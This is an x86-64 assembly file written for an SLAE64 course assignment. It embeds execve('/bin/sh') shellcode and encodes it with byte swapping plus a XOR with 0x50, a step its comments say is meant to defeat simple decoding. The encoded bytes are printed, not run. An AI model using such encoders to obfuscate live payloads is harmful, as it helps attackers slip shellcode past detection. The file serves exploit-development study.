; author     : Sandro "guly" Zaccarini SLAE64-1497
; purpose    : this program takes shellcode from 04-execve-stack.asm and swap bytes odd
;              with the next odd, even with next even, skipping already swapped ones
;              given ABCDEFGH, resulting shellcode will be: CDABGHEF
;              from a high point of view, i'm working with block of 4 bytes
;              plus, every byte is xored with an hardcoded value to prevent basic
;              "cyberchef" bruteforce
;              this code has been written for SLAE64 assignment 4
; license    : CC-BY-NC-SA
;
; r14 => used for the first move
; r15 => pointer to SC starting address
; rcx => main counter
; rbx => counter used for the 4bytes swapping

  global _start

  section .text
  SC: db 0x48,0x31,0xc0,0x50,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0x48,0x83,0xc0,0x3b,0x0f,0x05

; i'm using this function to debug like "printf". i know initial values, and i calculated
; with pen and paper what i expect: piping this code to xxd is a very fast way to proof
; it could be easily skipped
  writeexit:
; don't care about previous env, junk it and print my 0x20 chars
pop rax
xor rax,rax
xor rdi,rdi
inc rdi      ; print to STDOUT of course
mov rsi,rsp
mov al,0x1   ; write syscall id
mov rdx,rax
mov dl,0x20  ; hardcoded len, i know it's 32chars => 0x20
syscall
xor rax,rax
mov rdi,rax
mov al,0x3C  ; and a neat exit, because when i print i don't want to exec
syscall

; testodd and odd are explained on line ~92
  testodd:
test bx,1 ; if odd
jz odd
ret
  odd:
inc rbx
inc rbx
ret

  _start:
; make room for the shellcode, i know that the stack is rwx but memory where i have SC
; is r-x, so i will have sefgault if i try to write there. on modern system of course
; this won't work because of NX
sub rsp,0x28

; move SC starting point to r15
lea r15,[rel SC]

; counter to copy the whole shellcode to stack
xor rcx,rcx
push rcx
pop r14
push rcx
pop rbx

; given i handle bytes in couple, i have to loop for half the length
add cx,0x10
  copy:
; mov is heavy in term of bytes, but we don't need this shellcode to be small
; take rbx-th byte
mov byte r14b,[r15+rbx]
; xor it
xor r14b,0x50 ; i'd like to start with a nop, so i should xor with 0x50
              ; unfortunately, i already have a 0x50 byte in my shellcode so it will lead
              ; to nullbytes. doesn't matter, because i'm running this on MY box
inc rbx
inc rbx
; and swap it as discussed on top
mov byte [rsp+rbx],r14b

; do the same with the counterpart
mov byte r14b,[r15+rbx]
xor r14b,0x50
dec rbx
dec rbx
mov byte [rsp+rbx],r14b
inc rbx

; i know that if rbx is odd, i already encoded a 4bytes block: i have to move to the
; next block by incrementing rbx by 2
call testodd
; loop until rcx is 0, that means i worked on all shellcode
loop copy

; actually i can't jmp rsp, so better write the shellcode to STDOUT :)
call writeexit
